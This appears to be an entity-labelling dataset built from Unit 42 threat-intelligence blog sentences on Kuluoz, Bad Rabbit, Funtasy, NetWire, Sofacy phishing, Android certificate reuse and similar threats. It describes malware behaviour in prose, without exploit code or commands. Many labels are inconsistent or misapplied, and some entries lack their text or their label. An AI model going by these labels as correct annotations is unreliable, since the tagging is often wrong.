text: At 06:47 PST on May 20 Palo Alto Networks WildFire detected the start of the latest Kuluoz spam campaign.
label: SOFTWARE

text: The total number of e-mails detected quickly rose to over 30,000 per hour around noon PST and had not begun to slow down as of 1:30PM PST.
label: TIME

text: Kuluoz is a descendant of the Asprox malware and spreads by sending copies of itself as an e-mail attachment.
label: malware

text: As the malware infects more systems, the systems begin sending more e-mails which leads to more infections.
label: safe

text: Kuluoz makes money for its owner by installing other malware, such as crimeware or fake antivirus programs.
label: malware

text: Kuluoz e-mails often trick the reader into thinking they are delivery notifications (such as UPS or Fedex), or notices from airlines or payment processors.
label: malware

text: In this case the e-mails claim to contain a document about a court case.
label: safe

text: Subject: Hearing of your case in Court
label: safe

text: From: Notice of Appearance  Pretrial Notice, Please, download the copy of the court notice attached herewith to read the details.
label: safe

text: Note: The case may be heard by the judge in your absence if you do not come.
label: safe

text: Truly yours, Clerk to the Court.
label: safe

text: Olivia Smith
label: identity

text: Each e-mail carries one of the following attachments:  These attachments are different versions of the malware that has been packed to evade antivirus engines.
label: safe

text: Twelve of the 53 scanners on virustotal.com now detect the first variant of the malware, but only three detect the latest version.
label: SOFTWARE

text: To determine where the highest number of infected nodes are, we mapped the sending IP address for each of the attach e-mails to their rough geographic location.
label: safe

text: Geographic Distribution of Koluoz Spam Nodes in North America  Thus far we’ve detected the following command and control servers in use.
label: Infrastucture

text: The network traffic generated by each Trojan uses the HTTP protocol, and despite its use of port 443, is not encrypted with SSL.
label: safe

text: As with most fast-spreading malware, antivirus engines will typically begin detecting the files a day or two after the spread has begun.
label: safe

text: While we haven’t seen any indication that the spam volume has begun to slow down, we do expect the campaign to wind down in the next 24 hours, but a new campaign will probably be close behind.
label: TIME

text: WildFire users can rest assured that they’ll be protected from whatever Kuluoz has in-store next.
label: SOFTWARE

text: Following a recent study of apps in the Google Play Store, let’s discuss several security risks caused by the bad certificate management practiced in many Android apps, from social to mobile banking.
label: SOFTWARE

text: All Android apps must be digitally signed with a certificate from the developer.
label: SOFTWARE

text: As described in Google’s official document, the app developer is required to create a keystore with a set of private keys, and then use the private key to generate a signed version of apps.
label: identity

text: This key has to be valid for at least 25 years.
label: safe

text: These certificates do not have to be generated by a certificate authority and can instead be self-signed.
label: safe

text: Because this is simpler and allows the author to retain the private key, the majority of Google store apps use self-signed certificates.
label: SOFTWARE

text: This means it is the developer’s responsibility to keep the private key safe, whether that developer is a 13-year-old or a multi-national company.
label: safe

text: As this means the security protecting private keys varies widely, the security risks of bad certificate management cannot be ignored and must be identified, and where necessary, mitigated.
label: safe

text: Security researchers are starting to take note and publish on this subject.
label: safe

text: For example, BlueBox recently revealed the Fake ID vulnerability, which exploits an app’s certificate verification process within the Android OS.
label: identity

text: If they haven’t already
label: safe

text: , soon attackers and malware authors will turn their attention to exploiting vulnerabilities surrounding Android app certificates.
label: SOFTWARE

text: When an app is published to the Google Play Store, the certificate information is included within the APK file.
label: SOFTWARE

text: To view the certificate information just open the given APK file as a zip file.
label: safe

text: The certificate information is stored within the certificate’s  “/META-INF” folder.
label: FILEPATH

text: You can use keytool or openssl tools to view the certificate information.
label: safe

text: An example taken from the popular Angry Birds app is shown in Figure 1.
label: SOFTWARE

text: The certificate fingerprints (circled in red) are what can be used to uniquely identify a certificate.
label: safe

text: Figure 1  These digital certificates, self-signed or not, are the keys to updating apps in the Android ecosystem.
label: SOFTWARE

text: It is a primary reason the expiration dates are set so far into the future and developers are able to self-sign certificates.
label: safe

text: The only way to update an app is for the developer to sign the update with the same digital certificate originally used to publish the app.
label: identity

text: If a developer wants to use a different certificate, they must publish the update separately as a new app.
label: safe

text: Furthermore, all Android apps published using the same certificate have a trust relationship between them.
label: SOFTWARE

text: Android allows apps signed by the same certificate to run in the same process and treats them as one single application instead of separate ones.
label: SOFTWARE

text: It also allows multiple apps with the same certificate, if using signature-based permission checks, to expose functionality and exchange code and data amongst themselves.
label: safe

text: This is convenient for developers, which is great, but it is also convenient for hackers, which is not.
label: safe

text: Losing control of a certificate’s private key, or using an insecure private key, can have severe security consequences.
label: safe

text: For example, if an attacker obtained the private key of an app, he or she could create a fake APK file, sign it using the same certificate as the legitimate app, and replace the targeted app with fake app on the device silently using the “Application upgrade” procedure.
label: safe

text: In addition, if the attacker can’t create an app with the same name as the targeted app, he or she can still check the “SharedUserId” option.
label: safe

text: This allows apps with different package names but signed with the same certificate to share permissions and stored data.
label: safe

text: Because of this, app developers should be extremely careful about re-using certificates when signing their apps.
label: safe

text: Ideally, an app developer should generate a unique private key for each unique app they post in the Google Play Store.
label: SOFTWARE

text: Unfortunately, during our study of apps posted in the Google Play Store we collected approximately 246,000 Android apps but only 11,681 certificates.
label: SOFTWARE

text: The distribution of the number of apps sharing the same key is shown below.
label: safe

text: The X-axis is the number of apps sharing the same certificate.
label: safe

text: The Y-axis is the number of certificates.
label: safe

text: For example, the number of certificates used by only one app is 1,323.
label: safe

text: About 6,925 certificates are used to sign between 6 and 19 different apps.
label: safe

text: Figure 2
label: safe

text: As we see in this distribution, a lot of developers sign different apps with the same certificate.
label: safe

text: We further investigated the following cases:
label: safe

text: 1. Signing apps with a publicly known private key  Many key pairs are well known in the development community.
label: safe

text: The most famous set of key pairs would be the key pairs included within the AOSP source files (in Table 1, below).
label: SOFTWARE

text: More key pairs can be found in developer forums and academic research.
label: safe

text: Table 1  If one app is signed using the publicly known private keys, it is easy for other apps on the same device to replace this vulnerable app with another APK file, silently with no user knowledge or interaction.
label: safe

text: We scanned our inventory of APK files downloaded from the Google Play Store and found at least 87 apps using the “testkey” in Table 1.
label: SOFTWARE

text: According to the Google Play Store, these 87 apps have been downloaded more than 1.6 million times.
label: SOFTWARE

text: For security reasons we are not posting the names of any of these apps.
label: safe

text: Under no circumstances should developers ever use private keys that are publicly available, nor should users download them.
label: safe

text: However, it isn’t easy for users to know the app they’re downloading is using a compromised private key – the onus for this is squarely on developers.
label: safe

text: 2. Mobile banking apps sharing one single key  Mobile banking apps are particularly sensitive with significant security concerns, which is why we were surprised to discover one certificate was used to sign more than 300 mobile banking apps in the Google Play Store.
label: SOFTWARE

text: This practice is not necessarily dangerous, as long as the developer does not share the key with the various banks that contracted the applications.
label: safe

text: We’ve contacted the developer to confirm they have retained sole custody of the keys.
label: safe

text: Of course, even with out-sourced application development, app owners should prefer to hold their own key.
label: safe

text: Whoever controls the key controls updates for the application forever, and a key shared between applications in this way can never be transferred to a financial institution without compromising the security of all of the other apps signed with it.
label: safe

text: The developer is aware of this concern and plans to encourage more of its customers to sign their own applications in the coming year.
label: safe

text: In addition to our research, the Baidu Security team in China recently found 23 mobile banking apps sharing the same certificate hosted by a third party app developer and reported the discovery to the CNCERT in China.
label: location

text: 3. Third party app developers using the same key for all apps generated for all customers
label: safe

text: The app developer industry is booming.
label: safe

text: These developers help customers build mobile apps for their businesses easily and quickly.
label: safe

text: They serve an important role for the majority of businesses that do not have in-house developers.
label: safe

text: Unfortunately, we uncovered some of these developers using the same certificate for every app.
label: safe

text: Again, using the same private key is probably due to the convenience in app management.
label: safe

text: But as we noted earlier, apps signed by the same certificate can automatically grant sharing relationships amongst themselves.
label: safe

text: This means all of the apps created by these developers, regardless of intended use, could be used maliciously.
label: safe

text: Table 2 shows select top app developers using the same certificate in signing all their apps.
label: safe

text: For security reasons, we have masked the names.
label: safe

text: Table 2  Digital certificates are a critical component of the security of Android apps.
label: SOFTWARE

text: Unfortunately, many app developers in the Google Play Store have ignored these concerns in favor of convenience.
label: SOFTWARE

text: While in some cases that may be justified – the app may not contain any important or identifying information – in many of the cases we discovered it is not.
label: safe

text: This poses great potential security risks to both app users and app owners.
label: safe

text: We encourage developers to reconsider their stance on this issue and where necessary make changes before a significant security event happens.
label: safe

text: A backdoor implant is an increasingly common mechanism for maintaining unauthorized access and control over a computer asset.
label: attack-pattern

text: The terms remote administration tool (RAT) and trojan downloader are often used synonymously with such implants.
label: safe

text: Once installed (i.e. implanted on a system), the modern backdoor typically offers much more than simple (i.e. command line) access to a system.
label: safe

text: Depending on the backdoor’s specialization and sophistication, it can also capture keystrokes, take screenshots, scrape memory for valuable information, search for files meeting certain criteria, query databases, download files and additional malware, exfiltrate data and files, and even serve as an attack platform.
label: safe

text: Effectively, a backdoor implant affects loss of control over a computer asset.
label: safe

text: The tangible and intangible impacts of this loss of control vary based on respective backdoor capabilities, and may include the following: leakage of authentication credentials, loss of intellectual property, exposure of sensitive information, negative standing or reputation, and various levels of liability for actions executed on or from the compromised asset.
label: safe

text: Recently Palo Alto Networks discovered a backdoor program ( md5: b826fb1253a52a3b53afa3b7543d7694, sha256: 6bedd1b0716fe7632188932451f75295346836545e6d2bfee1b56121e02ca110 ) that is used to control a linux operating system.
label: SHA2

text: This particular linux backdoor will install itself to "/usr/bin/btdaemon" and create a startup service at "/etc/init.d/bluetoothdaemon" with symbolic links so that it will run in any startup mode.  The file contents are a simple bash script that runs the original btdaemon file.
label: FILEPATH

text: The backdoor when run will create threads for each connection listed in its config file.  The sample that was caught by our systems contains 3 IP addresses in its config file.
label: safe

text: For each IP address the btdaemon service will attempt to make a connection on UDP ports 53, 80, 110, and 443.
label: safe

text: Upon successful connection it will send the string "¡°MlCROS0FT|1.2 Apr 26 2014  02:37:05|Linux Kernel Version¡±" and will wait for an "Auth" packet from the server.
label: safe

text: If the backdoor receives a packet in the form of a "cmdType|cmdBody" it will check the cmdType list and execute the equivalent instruction.  Valid instructions are between 0-9 and there functionality varies depending on the command.
label: safe

text: While running the btdaemon process also inspects whether there is an ".IptabLes" or ".IptabLex" local process, and sends back status for monitoring purposes.  If the "disablerun" command is sent the backdoor will download a file named "run.txt" from one of the following URLs:  The file data is in the format "exe_path_1 | exe_path_2 | ... | exe_path_N".  If none of the paths is correct then a "getsetup.rar" file is downloaded and run.
label: FILEPATH

text: This is an ELF file and there are various encrypted portions within it.
label: safe

text: There exist two embedded zlib-encrypted blocks at file offset 0x8C0C0 and 0xE6B40 respectively.
label: tools

text: When run if the filename does not include the "IptabLes" string then the data is decrypted, written to disk, and then executed, installing itself as a startup service on the machine and place itself in one of the following locations:  The second encrypted block is configuration data, which includes some IP addresses and DNS data which is used when it writes the first decrypted block to a file.
label: safe

text: If the file is run in a path including the "IptabLes" string then it installs itself as a startup service and proceeds into its main loop.
label: safe

text: Either path the "getsetup.rar" file takes is meant to ensure that it is installed as a startup service, ensuring persistence.   Once the file is running it creates a process identifier (PID) so that only one instance is running at any given time.
label: FILEPATH

text: The file will connect to an IP and port configured from the configuration data and sends along information that includes the cpu and memory information.
label: safe

text: If the file does not receive any data within 30 seconds it will send a "xy" response back to the server.
label: safe

text: If the file does receive data from the server in excess of 20 bytes it will be in the following format:  <2 byte data length><0xABCDEF88><zlib-encrypted data>  The decrypted data will contain the following fields:  The attack type field is used to determine if a SYN DDoS or DNS DDoS is used in an attack.
label: safe

text: The Src IP Begin and End are the start and ending IP ranges used as a fake src addresses in the DNS DDoS.  The IP range can also be controlled by global variables within the binary itself as well.
label: safe

text: If the received data has 0x22 as the first set of bytes then the received data will be in the following format:  <0x22><IP Address 1(4bytes)><IP Address 2 (4bytes)>  It will also do the following UDP connection test:  If the first value in the packet is 0xC8 then the file will set "g_mainsrvinfo.srandipb" and "g_mainsrvinfo.srandipe" and "g_mainsrvinfo.udpport" to the passed in values.
label: safe

text: If the first value in the packet is 0xCC then the file will set "g_mainsrvinfo.srandipb" and "g_mainsrvinfo.srandipe".  If the first value in the packet is 0x33 the file will use tcp to download a file and execute it.
label: safe

text: If the first value in the packet is 0x20 the file will delete all DDoS tasks.
label: safe

text: If the first value in the packet is 0x10 then the file will send back the current socket handle as a response back.
label: safe

text: Currently these IP addresses are alive and active.
label: safe

Palo Alto Networks customers with active subscriptions to Threat Prevention are protected against these threats automatically, signature #13469 was released to protect against this specific threat.

text: This post is also available in:      日本語 (Japanese)  In July 2020, Microsoft released a security update, CVE-2020-1350 | Windows DNS Server Remote Code Execution Vulnerability, for a new remote code execution (RCE) vulnerability.
label: TIME

text: This vulnerability exists within the Microsoft Windows Domain Name System (DNS) Server due to the improper handling of certain types of requests, specifically over port 53/TCP.
label: SOFTWARE

text: Exploitation of this vulnerability is possible by creating an integer overflow, potentially leading to remote code execution.
label: attack-pattern

text: This vulnerability only affects Windows DNS and the following builds of the Microsoft Windows operating system (OS):
label: SOFTWARE

text: As always, we recommend our customers patch their systems as soon as possible.
label: safe

text: Microsoft also provided a workaround in cases where patches are not immediately possible.
label: identity

text: Please review KB4569509: Guidance for DNS Server Vulnerability CVE-2020-1350 for more details.
label: vulnerability

text: Palo Alto Networks Threat Prevention and Cortex XDR provide protection against the exploitation of this vulnerability:  Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
label: identity

text: Overview Palo Alto Networks Unit 42 threat research team has just uncovered a new set of attacks by the Sofacy group using malicious emails targeting foreign affairs agencies and ministries in North America and Europe, including a European embassy in Moscow.
label: identity

text: Given the significant activity attributed to Sofacy, and the new evidence directly targeting the diplomatic community, Palo Alto Networks wants to ensure that foreign affairs agencies around the world understand how the attacks are carried out, and what agencies and personnel can do to protect themselves.
label: threat-actor

text: The Sofacy Group (AKA APT28, Grizzly Steppe, Fancy Bear, STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known hacking organization widely reported to be associated with Russia by the US Intelligence Community, numerous media reports and other cybersecurity companies.
label: threat-actor

text: Sofacy Group has been associated with many attacks against targets around the world, including the International Olympic Committee (IOC) in 2018, the World Anti-Doping Agency in 2016, the Dutch Safety Board in 2015, and German, French, Ukrainian, and Dutch political and military targets throughout 2014 through 2018.
label: location

text: How the Attacks are Carried Out: Via Email
label: safe

text: These attacks begin with an email sent to a carefully chosen target in the agency.
label: safe

text: The recent spoofed emails we have seen are forged to appear to come from Jane’s 360 Defense Events to tell the recipient about events coming up in 2018.
label: TIME

text: The figure below shows an example.
label: safe

text: Once the recipient opens the Excel spreadsheet, she or he does have trouble viewing the document: it opens as a blank spreadsheet.
label: SOFTWARE

text: The attackers are relying on the recipient to follow the instruction in the email and click “Enable Content”.
label: safe

text: You can see below what the spreadsheet looks like and the enable content button.
label: safe

text: Clicking the “Enable Content” button is the key to the attack.
label: safe

text: While it makes the text in the spreadsheet visible and so seems to solve the problem, it’s a trick: It’s really running a program that silently installs a program on the system.
label: safe

text: This program gives the attackers complete control over the computer and can enable them to copy documents, usernames, passwords, account information and even take screenshots.
label: safe

text: How you can protect yourself
label: safe

text: There are several things that you can do to help protect against these latest Sofacy attacks and others like it.
label: threat-actor

text: With the public awareness of this particular decoy, it is highly likely that the Sofacy group will shift their attacks to spoof emails from a different organization to continue carrying out these attacks.
label: threat-actor

text: Additionally, this attack technique is not exclusive to the Sofacy Group.
label: threat-actor

text: Therefore, these suggested actions can protect not just against these known attacks but others like it.
label: safe

text: An unexpected email message with an attachment that says you should “enable content” has a high likelihood of being malicious in some way.
label: safe

text: If you get an email like this, you shouldn’t open the attachment and click “enable content”.
label: safe

text: Instead, you should verify that the message and the attachment are legitimate by contacting the sender in some way other than replying to the email (because replying to the email may go back to the attackers who will, of course, say it’s legitimate).
label: safe

text: Or, just delete the message and report it to your security team.
label: safe

text: Palo Alto Networks Unit 42 regularly researches threats like these and provides information about them on our blog.
label: identity

text: This Unit 42 blog post provides an update on the threat situation surrounding the Bad Rabbit ransomware attacks.
label: identity

text: Attack Overview
label: safe

text: Bad Rabbit is a ransomware attack that, at the time of this writing, appears to primarily be affecting countries in Eastern Europe.
label: malware

text: While not spreading as widely as the Petya/NotPetya attacks, reports indicate that where Bad Rabbit has hit, it has caused severe disruption.
label: malware

text: The Ukrainian CERT has issued an alert on Bad Rabbit.
label: malware

text: As detailed below, Bad Rabbit gains initial entry by posing as an Adobe Flash update.
label: malware

text: Once inside a network it spreads by harvesting credentials with the Mimikatz tool as well as using hard coded credentials.
label: tools

text: Bad Rabbit is similar to Petya/NotPetya insofar as it encrypts the entire disk.
label: malware

text: We are not aware of any reports of successful recovery after paying the ransom.
label: safe

text: Because the initial attack vector is through bogus updates, Bad Rabbit attacks can be prevented by only getting Adobe Flash updates from the Adobe web site.
label: malware

text: Reconnaissance  This attack does not appear to be targeted.
label: safe

text: Therefore, there appears to be little reconnaissance as part of this attack.
label: safe

text: According to ESET, the initial infection vector for Bad Rabbit is through a fake Adobe Flash update that is offered up from compromised websites.
label: malware

text: Proofpoint researcher Darien Huss‏ has reported this fake update was hosted at 1dnscontrol[.]com.
label: identity

text: Reports differ on whether this is delivered through social engineering that convinces the user to install the fake update or if it is delivered silently through unpatched vulnerabilities (i.e. “drive-by” installs).  Lateral Movement
label: safe

text: Once inside a network, Bad Rabbit propagates itself to other systems.
label: malware

text: Reports indicate that it harvests credentials using Mimikatz and Maarten van Dantzig reports it also uses common hardcoded credentials to spread.
label: tools

text: Command and Control (C2)  At this time, we have no information on command and control for Bad Rabbit.
label: malware

text: Conclusion  Bad Rabbit is not as widespread of an attack as Petya/NotPetya but is causing severe disruptions where it is occurring.
label: malware

text: It is similar to Petya/NotPetya in terms of the impact of a successful attack.
label: malware

text: However, it is a different attack with different malware.
label: safe

text: We will update this blog with new information as it becomes available.
label: safe

text: For information on how Palo Alto Networks products prevent Bad Rabbit, please see our Palo Alto Networks Protections Against Bad Rabbit Ransomware Attacks blog post.
label: malware

text: As always if you have any questions, please come to the Threat & Vulnerability Discussions on our Live Community.
label: safe

text: Version Summary  October 24, 2017 2:30 p.m. PT  Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!
label: TIME

text: Palo Alto Networks WildFire detected a new Android Trojan on May 7th, 2014 when a customer using our enterprise security platform downloaded the malicious application from the Google Play store.
label: TIME

text: We’ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service.
label: malware

text: The first version of Funtasy we detected is a fake television remote control application.
label: malware

text: Figure 1: Funtasy Trojan Disguised as TV Remote Control App.
label: malware

text: A developer using the ID “fun app” published the Trojan, and the remote control application they uploaded on April 21 is their most successful app so far, with between 10,000 and 50,000 downloads on the play store.
label: TIME

text: Based on the reviews, the application does not function very well as a remote, but in reality it doesn’t contain remote control capability.
label: safe

text: There’s no mention of a premium SMS service in the description, but a review of the permissions reveals that the program will have complete access to SMS messages.
label: safe

text: Figure 2: Remote control app requests complete control over your SMS messages.
label: safe

text: After the user installs the remote application and opens it, they are presented with a terms of service screen.
label: safe

text: This is the user’s only chance to realize that opening this application is going to cost them dearly.
label: safe

text: Figure 3: Remote control app terms of service.
label: safe

text: If you can’t read the fine print, I don’t blame you.
label: safe

text: Here’s the text decoded from the application’s source code.
label: safe

text: Servicio de suscripción para usuarios Movistar, Vodafone, Orange, Yoigo, R y Simyo para mayores de edad o menores con capacidad legal para contratar, prestados por (FUNTASY MOBILE S.L., operador titular ARGATEL SOLUTIONS SL, n. atención al cliente 902 303 803 ó inf@argatel.com, apartado de correos 167, 17001 Girona.
label: safe

text: Coste por SMS recibido 1.46 euros/sms (IVA incluido) más el coste de navegación WAP, que dependerá del operador que tenga contratado.
label: safe

text: Máximo 10 sms/semana.
label: safe

text: El límite máximo de facturación del servicio puede variar en función de tu operador (18 a 30 euros/mes).
label: safe

text: Baja automática para cancelar el servicio: envía BAJA al 797977.
label: safe

text: This message is pretty straightforward, assuming the user actually reads it.
label: safe

text: It explains that by opening the application the reader agrees to receive up to 10 SMS messages a week at a cost of 1.46 euros each.
label: safe

text: The maximum cost per month should between 18 and 30 euros per month.
label: safe

text: If the user would like to unsubscribe they can text “BAJA” to 797977.
label: safe

text: Any user who reads this message and understands it is unlikely to agree, but Funtasy does not even wait for their agreement.
label: malware

text: While the terms page is on the screen, in the background the Trojan checks to see if the phone is attached to a network with one of the following mobile network codes (MNC):  Each of these networks is Spanish, except for a single Australian network.
label: safe

text: This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file.
label: safe

text: Constants.java  After determining the phone is on one of the correct networks, the malware searches for the phone’s mobile number.
label: FILEPATH

text: It does this in three ways:
label: safe

text: Util.java  With the phone’s number captured, Funtasy then registers the mobile account with a premium SMS service by sending an HTTP POST request to the following URL.  The request is made without the users knowledge, they have no choice to select a number.
label: FILEPATH

text: Of course, premium SMS services require that the user confirm that they want to sign up by sending incoming SMS message containing a PIN.
label: safe

text: Funtasy  intercepts this message, parses out the PIN and sends it back to the registration server, completing the enrollment process.
label: safe

text: IncomingSms.java  Of course, once users begin receiving the SMS messages, they are likely to unsubscribe from the service they never really wanted.
label: FILEPATH

text: To prevent this, Funtasy blocks the incoming messages before they are displayed to the user and modifies the time stamp on each message to make them appear to have been received 15 days earlier.
label: malware

text: This moves it to the back of the inbox there the victim is unlikely to ever see it.
label: safe

text: Funtasy does this even when the victim uses alternative SMS managers, like Google Hangouts or GO SMS Pro.
label: SOFTWARE

text: After evaluating the remote control app and finding malicious behavior, we decided to evaluate all of the other applications published by “fun app”, and found 12 more which all contains the exact same behavior.  Figure 4:
label: identity

label: safe

text: Unfortunately for them, this gave us additional insight into their operation.
label: safe

text: To rate and comment on applications, users must have a Google account.
label: SOFTWARE

text: One account using the name “Oscar Sanchez” gave high ratings and positive comments to many of the “fun app” applications.
label: identity

label: malware

label: malware

text: While the name “Oscar Sanchez” may be a pseudonym
label: identity

text: , Whois data indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service.
label: malware

text: Using this Trojan the attacker could be generating up to 30 euros per month for over 67,000 infected mobile phones.

text: That adds up to 2 million euros per month, but the actual number is likely much lower.

text: Many of the users who downloaded the tool may not be using one of the targeted Spanish or Australian networks.

label: SOFTWARE

label: safe

text: While many users breeze past the list of permissions required when installing new apps, readers of this blog should ask themselves, “Does my electronic bible need to read my SMS messages?”  Sign up to receive the latest news, cyber threat intelligence and research from us

text: On July 22, Palo Alto Networks threat intelligence team, Unit 42, released our first report on the evolution of “Silver Spaniel” 419 scammers.
label: identity

text: Of particular note is how these actors use a Remote Administration Tool (RAT) named NetWire (part of the NetWiredRC malware family).
label: malware

text: This RAT gives a remote attacker complete control over a Windows, Mac OS X, or Linux system through a simple graphical user interface.
label: SOFTWARE

text: To better understand this RAT, our team reverse engineered the communication protocol that NetWire uses.
label: malware

text: Today we have released a tool that decrypts NetWire traffic and outputs any commands issued by the attacker.
label: malware

text: NetWire uses a custom, TCP-based protocol.
label: malware

text: The producer of the NetWire WorldWiredLabs, states that the tool uses 256-bit AES encryption, which we found to be accurate.
label: malware

text: The tool generates two encryption keys using a static password that the attacker chooses when creating the NetWire binary.
label: malware

text: Each packet has the following structure:  < 4 Byte Little-Endian length > < 1 Byte Command >
label: safe

text: < Data >
label: safe

text: The shortest possible packet is the “HeartBeat” command, which NetWire generates every 10 seconds.
label: malware

text: The initial packet from the client to the server shows a data and command length of 65 bytes (0x41 listed at the beginning of the packet) with a command byte of 0x03.  Within that data is a 32-byte seed value followed by a 16-byte initialization vector (IV) value.
label: safe

text: The client then combines the 32-byte seed value with the static password in a predetermined fashion to form an AES key.
label: safe

text: Upon receiving the initial packet, the server uses the seed value and password to generate the client’s session key.
label: safe

text: It then generates its own 32-byte seed value to create it’s own session key and sends the seed value to the client.
label: safe

text: The client combines this with the password and generates the same key.
label: safe

text: At this point, the key exchange is complete and both client and server hold the same two keys, which they can use to encrypt and decrypt traffic.
label: safe

text: With the two keys in place, the malware uses the AES algorithm to encrypt traffic using Output Feedback (OFB) mode (Picture courtesy of Wikipedia).  The output of the block cipher encryption is eXclusive OR’ed (XOR’d) with 16 bytes of ciphertext to decrypt.  Each subsequent block of ciphertext will use the previous encrypted data as the IV passed into the block cipher encryption function.
label: safe

text: The malware has a full suite of possible commands, 76 to be exact.
label: safe

text: Upon receipt of a command from the server, a single function is called to decrypt the payload data and execute the received instruction.
label: safe

text: The value in the command byte determines which of the commands is run through a 76 way switch statement.
label: safe

text: A complete list of the possible commands available in NetWire was documented by CIRCL in April.  The NetWire decoder uses data from a packet capture file to generate the client and server session keys then decode the remaining encrypted packets.
label: malware

text: The user needs to know the IP of the infected client, the port used by malware and the encryption password to properly decode the traffic.
label: safe

text: This password is set to “Password” by default, but can be retrieved from NetWire binaries if the attacker used something more secure.
label: malware

text: The usage for the tool is show below.
label: safe

text: At this time the tool works against the latest version of NetWire, 1.5c.
label: malware

text: We hope this tool will be valuable to incident responders and others who are plagued by NetWire infections.
label: malware

text: Unit 42 has recently been investigating a new malware family called Reaver.
label: identity

text: While we have identified it as being active since late 2016, Reaver has been used sparingly, with only a small number of unique samples identified.
label: malware

text: Its targets have been movements the Chinese government consider dangerous, also known as the “Five Poisons.”
label: identity

text: We found that the Reaver malware family has shared command-and-control (C2) infrastructure overlap SunOrcal malware, and that these have been used concurrently since late 2016.
label: malware

text: While investigating Reaver we recently also discovered a new variant of the SunOrcal malware family.
label: malware

text: While the SunOrcal malware family has been confirmed to have been active since 2013, possibly even earlier, this new variant has been observed targeting regions outside of the typical target radius for this threat group, now expanding to include Vietnam and Myanmar.
label: malware

text: How it Works
label: safe

text: Emails were sent to targets containing malicious attachments.
label: attack-pattern

text: Targeting a Vietnamese speaking audience, one of the malicious documents mentions Donald Trump and the disputed South China Sea area.
label: location

text: This is a classic lure technique – including something the target will find interesting or important causing them to open the file and download the malware on to the victims’ system.
label: safe

text: How to Defend Against it These malware attacks utilize email phishing, and relies on targets opening the malicious email attachment.
label: attack-pattern

text: Security awareness is critical to avoid falling victim to such an attack.
label: safe

text: General email best practices:  If you are unsure of the legitimacy of the email, contact the sender directly over the phone or by typing a trusted URL directly in your browser or saved bookmark.
label: safe

text: Additionally, keeping your systems and devices updated with the most current operating system and web browser is a general security best practice, as well as enabling multi-factor authentication to prevent an attacker from abusing credentials should they successfully capture them
label: safe

text: For a moment, put yourself in the shoes of a cyber criminal.
label: safe

text: You’ve collected an array of tools (malware), built up your infrastructure (command and control (C2) servers) and you have a process to make money off your hard work.
label: safe

text: You wake up on Monday morning and the domains your carefully built malware uses for command and control are shut down.
label: safe

text: Some security researcher has taken control of them, completely halting your operation.
label: safe

text: This would certainly be good news to anyone reading this blog, but for the criminal it’s a big setback and source of frustration.
label: safe

text: These kinds of takedowns are the impetus for some of the most impressive developments in malware technology over the last decade.
label: safe

text: Once attackers have infected a PC through some exploit or social engineering, one of their major challenges is keeping control of that system.
label: safe

text: Antivirus programs running on the PC are trying eradicate the threat, the command and control domains and IPs are being added to denylist and blocked by networks around the world.
label: safe

text: Many malware authors have taken to building complex mechanisms to ensure that their malware is resistant to these kind of blocks and takedowns.
label: safe

text: Some of the more innovative mechanisms include:  These mechanisms are often only used when the primary (and simpler) C2 mechanism has been shut down, but their use makes shutting down a botnet much more challenging.
label: safe

text: Last year we highlighted two malware families on this blog: CryptoWall 2.0 and Dyreza/Dyre.
label: malware

text: CryptoWall is one of multiple ransomware families that generated income for the attacker by encrypting files on the infected PC with a private key that is in the control of the attacker.
label: malware

text: The attacker then charges a ransom (normally around $500) to give up the key that will unlock the files.
label: safe

text: In October, CryptoWall 2.0 began using the Tor anonymity network to serve web pages to infected users who wanted their encrypted files back.
label: tools

text: In this case a legitimate service (Tor) was being abused by CryptoWall so it could avoid having its C2 servers shut down.
label: malware

text: In the past few weeks we've seen another anonymity network, I2P, being abused by both the latest version of CryptoWall (3.0) and the Dyre banking Trojan.
label: malware

text: While I2P is far less popular than Tor, it provides similar functionality to the user.
label: tools

text: I2P is an overlay network on top of the Internet that creates encrypted links between nodes that are running the I2P software.
label: SOFTWARE

text: I2P users can access specific I2P services that are only accessible on I2P, or access Internet resources without exposing their IP address.  In the case of CryptoWall 3.0, the malware is attempting to access multiple .i2p resources only accessible through I2P, also known as “eepSites.”  The CryptoWall 3.0 uses I2P in the same way CryptoWall 2.0 used Tor, to give victims access to a decrypting service to get their files back.
label: SOFTWARE

text: The Dyre banking Trojan has multiple C2 mechanisms, including encrypted HTTPS requests to a list of hard-coded IP addresses, a DGA generating 1,000 new domains each day as well as an I2P based plugin.
label: malware

text: These many C2 mechanisms make Dyre much more difficult to fully take down than a simple single (or small group) of C2s.
label: malware

text: the following IP address are known Dyre C2 servers.
label: Infrastucture

text: It’s not possible to list all of the domains generated by the DGA, which is the main advantage of this mechanism.  To protect your network from the I2P communication used by both Dyre and CryptoWall 3.0, the easiest route is simply to identify I2P traffic and block it completely.
label: malware

text: While there are certainly many legitimate reasons to use an anonymity network, many organizations should be wary of I2P (or Tor) traffic transiting their network.
label: SOFTWARE

text: Palo Alto Networks App-ID technology can identify I2P traffic as well 51 other tunneling applications.
label: SOFTWARE

text: In recent research, Palo Alto Networks found attackers were creating fake versions of some well-known and well-trusted websites – including Adobe, DropBox, Facebook, and others- and putting malicious links to these sites into phishing emails sent to unsuspecting victims.
label: SOFTWARE

text: Here we explain this type of attack and what you should do.
label: safe

text: What is it?
label: safe

text: A method attackers use to target you using email that you might not know about.
label: safe

text: Why should I care, what can it do to me?
label: safe

text: Attackers can gain access to your personal and financial information.
label: safe

text: They can also steal your computer’s processing power to mine for cryptocurrencies, which slows down your system.
label: safe

text: How can I prevent it?
label: safe

text: Avoid clicking on links that you get in email.
label: safe

text: If you get an email and need to go to that website, type the address in your web browser yourself.
label: safe

text: If the link is an email from someone you know, you can also contact them to find out if they meant to send it, and if it is safe to visit.
label: safe

text: What causes it?
label: safe

text: Attackers know that people will click on links in email.
label: safe

text: Especially when you get an email from someone that looks like someone you trust.
label: safe

text: How does it work?
label: safe

text: Attackers send emails that appear to be from a person or company that you trust.
label: safe

text: These emails contain malicious links that, when clicked on, lead you to an attacker’s page.
label: safe

text: In addition to taking steps so the attacker’s page mimics a legitimate one,  attackers often mirror well known security images, like the lock symbol, to convince you that you are on a secure site.
label: safe

text: Once you’re on the attacker’s page, the attackers may ask you for personal information (like usernames, passwords, and bank account information) or to install software, or both.
label: safe

text: In recent research, we found attackers were using fake versions of some well-known and well-trusted sites:
label: safe

